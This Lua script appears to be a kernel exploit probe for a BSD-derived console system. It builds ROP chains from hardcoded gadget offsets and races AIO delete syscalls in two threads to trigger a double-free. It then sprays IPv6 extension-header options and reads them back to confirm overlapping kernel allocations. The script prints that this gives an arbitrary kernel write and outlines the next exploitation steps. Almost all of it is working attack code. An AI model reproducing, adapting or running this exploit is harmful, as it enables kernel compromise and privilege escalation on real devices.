-- CRASH_CLASS: HIGH
-- PROBE 74b: prolapse overlap detection — double-free + IPv6 spray + oracle
--
-- Based on zecoxao's prolapse architecture adapted to our Lua framework.
-- The 65l race is proven (65/480 double-frees). This probe:
--   1. Submits AIO requests (NO 670 init!)
--   2. Polls them to completed state
--   3. Races 662 with 2 child threads (proven 65l pattern)
--   4. After double-free: spray IPv6 ext-header options into 128B zone
--   5. Readback all sprayed sockets — tag mismatch = overlap = double-free CONFIRMED
--   6. If overlap found: the two sockets sharing the chunk ARE the reclaim handles
--
-- REQUIRES: 74a must confirm which ext-header option works (DSTOPTS vs HOPOPTS)
-- This probe tries DSTOPTS first, falls back to HOPOPTS.

print("=== PROBE 74b: PROLAPSE OVERLAP DETECTION ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wb(a, v) pcall(function() memory.write_byte(a, v) end) end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return N(v) end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot base for gadgets
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Constants
local AF_INET6 = 28
local AF_UNIX = 1
local SOCK_DGRAM = 2
local SOCK_STREAM = 1
local IPPROTO_IPV6 = 41
local IPV6_DSTOPTS = 50
local IPV6_HOPOPTS = 49

-- ============================================================
-- STEP 0: Select working spray option
-- ============================================================
print("")
print("[0] SELECTING SPRAY OPTION")

local spray_opt = nil
local function build_exthdr(optlen, tag)
    local buf = memory.alloc(optlen + 16)
    local ba = N(buf)
    for i = 0, optlen - 1 do wb(ba + i, 0) end
    wb(ba + 0, 0)
    wb(ba + 1, math.floor(optlen / 8) - 1)
    local dl = optlen - 4
    if dl > 255 then dl = 255 end
    wb(ba + 2, 1)
    wb(ba + 3, dl)
    if tag then wd(ba + 8, tag) end
    return buf, ba
end

local s_probe = sgn(mk(97)(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(0)))
if s_probe >= 0 then
    for _, opt in ipairs({IPV6_DSTOPTS, IPV6_HOPOPTS}) do
        local buf, ba = build_exthdr(120, 0xDEAD0000)
        local ok, ret = pcall(function()
            return mk(105)(uint64(s_probe), uint64(IPPROTO_IPV6), uint64(opt), uint64(ba), uint64(120))
        end)
        if ok and sgn(ret) == 0 then
            spray_opt = opt
            print(string.format("  option %d accepted", opt))
            break
        else
            print(string.format("  option %d rejected", opt))
        end
    end
    mk(6)(uint64(s_probe))
end

if not spray_opt then
    print("  NO spray option works. Cannot proceed.")
    print("=== 74b COMPLETE (BLOCKED) ===")
    return
end

-- ============================================================
-- STEP 1: AIO helpers (NO 670 init!)
-- ============================================================
print("")
print("[1] SETTING UP AIO (no 670!)")

-- Open socketpairs for pending AIO reads
local function mk_socketpair()
    local sv = memory.alloc(16)
    wd(N(sv), 0); wd(N(sv) + 4, 0)
    local ok, ret = pcall(function()
        return mk(135)(uint64(AF_UNIX), uint64(SOCK_STREAM), uint64(0), uint64(N(sv)))
    end)
    if ok and sgn(ret) == 0 then
        return rd(N(sv)) or -1, rd(N(sv) + 4) or -1
    end
    return -1, -1
end

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x2000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

-- Submit single AIO read on a socketpair fd (stays PENDING)
local function submit_pending(fd)
    wq(N(reqs), uint64(0))            -- offset
    wq(N(reqs) + 8, uint64(16))       -- nbytes
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

-- Submit on /dev/zero (completes immediately)
local function submit_devzero(fd_zero)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh2, rl2 = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl2); wd(N(reqs) + 0x1C, rh2)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0
end

local function cancel_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(666)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0
end

-- Open /dev/zero for completed AIO
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do wb(N(p) + i - 1, string.byte(s, i)) end
    wb(N(p) + #s, 0)
    return p
end
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("  /dev/zero fd=" .. fd_zero)

-- ============================================================
-- STEP 2: PRE-DRAIN — cycle AIO objects to warm the allocator
-- ============================================================
print("")
print("[2] PRE-DRAIN: cycle 128 AIO objects")
local drain_ok = 0
for i = 1, 128 do
    local id = submit_devzero(fd_zero)
    if id ~= 0 then
        poll_one(id)
        delete_one(id)
        drain_ok = drain_ok + 1
    end
end
print(string.format("  cycled %d objects", drain_ok))

-- ============================================================
-- STEP 3: RACE + SPRAY + ORACLE (main loop)
-- ============================================================
print("")
print("[3] RACE + SPRAY + ORACLE")

local BATCH = 16
local ITERS = 20
local SPRAY_N = 256  -- sockets per spray wave
local OPTLEN = 120   -- 120 bytes → 128B UMA zone

local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)

local total_doubles = 0
local total_overlaps = 0

for iter = 1, ITERS do
    if not alive() then print(string.format("  iter %d: DEAD", iter)); break end

    -- Submit BATCH AIO on /dev/zero → completes immediately
    local ids = {}
    for i = 1, BATCH do
        local id = submit_devzero(fd_zero)
        if id ~= 0 then
            poll_one(id)
            ids[#ids + 1] = id
        end
    end
    if #ids < 4 then print("  iter " .. iter .. ": too few IDs"); break end
    local count = #ids

    -- Set up race buffers
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    -- Build child A: call 662(ids, count, states_A) then thr_exit
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    -- 662(del_ids, count, states_A)
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662)); emA(stub)
    -- thr_exit(0)
    emA(g_pop_rdi); emA(uint64(0)); emA(g_pop_rax); emA(uint64(431)); emA(stub)

    -- Build child B: call 662(ids, count, states_B) then thr_exit
    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662)); emB(stub)
    emB(g_pop_rdi); emB(uint64(0)); emB(g_pop_rax); emB(uint64(431)); emB(stub)

    -- thr_new params
    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)  -- start_func = bare ret (child starts at RSP)
    wq(N(par_A) + 0x10, uint64(sb_A)); wq(N(par_A) + 0x18, uint64(0x2000))

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B)); wq(N(par_B) + 0x18, uint64(0x2000))

    -- Launch both children simultaneously
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Wait for children (spin)
    for w = 1, 80000 do local _ = rd(sb_A) end

    -- Check double-free status
    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then
            doubles = doubles + 1
        end
    end
    total_doubles = total_doubles + doubles

    if doubles > 0 then
        print(string.format("  iter %d: %d DOUBLE-FREE → spraying %d sockets",
            iter, doubles, SPRAY_N))

        -- SPRAY: fill the 128B zone with tagged IPv6 ext-header options
        local spray_fds = {}
        for i = 1, SPRAY_N do
            local s = sgn(mk(97)(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(0)))
            if s >= 0 then
                local buf, ba = build_exthdr(OPTLEN, 0xAA000000 + i)
                local ok, ret = pcall(function()
                    return mk(105)(uint64(s), uint64(IPPROTO_IPV6),
                        uint64(spray_opt), uint64(ba), uint64(OPTLEN))
                end)
                if ok and sgn(ret) == 0 then
                    spray_fds[#spray_fds + 1] = { fd = s, idx = i }
                else
                    mk(6)(uint64(s))
                end
            end
        end
        print(string.format("    sprayed %d sockets", #spray_fds))

        -- ORACLE: read back every socket, check for tag mismatch
        local overlaps = {}
        for _, entry in ipairs(spray_fds) do
            local buf_get = memory.alloc(256)
            local ba_get = N(buf_get)
            for j = 0, 255 do wb(ba_get + j, 0) end
            local lenp = memory.alloc(8)
            wd(N(lenp), 256)
            local ok, ret = pcall(function()
                return mk(118)(uint64(entry.fd), uint64(IPPROTO_IPV6),
                    uint64(spray_opt), uint64(ba_get), uint64(N(lenp)))
            end)
            if ok and sgn(ret) == 0 then
                local tag = rd(ba_get + 8) or 0
                local expected = 0xAA000000 + entry.idx
                if tag ~= expected then
                    local other_idx = tag - 0xAA000000
                    if other_idx > 0 and other_idx <= SPRAY_N then
                        overlaps[#overlaps + 1] = {
                            fd_a = entry.fd, idx_a = entry.idx,
                            tag_found = tag, other_idx = other_idx
                        }
                        print(string.format(
                            "    *** OVERLAP: socket[%d] reads tag from socket[%d]! ***",
                            entry.idx, other_idx))
                    else
                        print(string.format(
                            "    GARBAGE tag: socket[%d] has 0x%08X (not from our spray)",
                            entry.idx, tag))
                    end
                end
            end
        end

        total_overlaps = total_overlaps + #overlaps

        if #overlaps > 0 then
            print(string.format("    !!! %d OVERLAPS DETECTED — DOUBLE-FREE CONFIRMED !!!",
                #overlaps))
            print("    These two sockets share the same kernel 128B chunk.")
            print("    Writing to one (setsockopt) overwrites the other's kernel object.")
            print("    = ARBITRARY KERNEL WRITE into the 128B zone")

            -- Dump overlap details
            for _, ov in ipairs(overlaps) do
                print(string.format("    overlap: fd_a=%d(idx=%d) ← tag from idx=%d",
                    ov.fd_a, ov.idx_a, ov.other_idx))
            end

            -- DON'T cleanup spray — keep the overlapping sockets alive for next steps
            print("")
            print("*** EXPLOITATION READY ***")
            print("The overlapping sockets are our reclaim handles.")
            print("Next: setsockopt on handle A sets entry+0x40 (notify pointer).")
            print("Then trigger free_queue_entry → arb-decrement at notify+0x28.")
            break  -- Exit loop on first confirmed overlap
        end

        -- Cleanup spray for this iteration
        for _, entry in ipairs(spray_fds) do mk(6)(uint64(entry.fd)) end
    else
        if iter % 5 == 0 then
            print(string.format("  iter %d: no double", iter))
        end
    end
end

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
print("=== SUMMARY ===")
print(string.format("  Iterations:   %d", ITERS))
print(string.format("  Double-frees: %d", total_doubles))
print(string.format("  Overlaps:     %d", total_overlaps))
print(string.format("  Process:      %s", alive() and "ALIVE" or "DEAD"))

if total_overlaps > 0 then
    print("")
    print("*** DOUBLE-FREE → SPRAY RECLAIM → OVERLAP CONFIRMED ***")
    print("This is the core primitive for kernel exploitation.")
elseif total_doubles > 0 then
    print("")
    print("Double-frees hit but no overlap detected in spray.")
    print("Possible causes:")
    print("  - Spray option doesn't land in same 128B zone as AIO entry")
    print("  - Need more spray sockets (increase SPRAY_N)")
    print("  - Need zone drain before spray")
    print("  - Need different optlen")
else
    print("")
    print("No double-frees hit. Race timing may need adjustment.")
    print("  - Try more iterations")
    print("  - Try CPU pinning via cpuset_setaffinity(488)")
end

print("")
print("=== 74b COMPLETE ===")
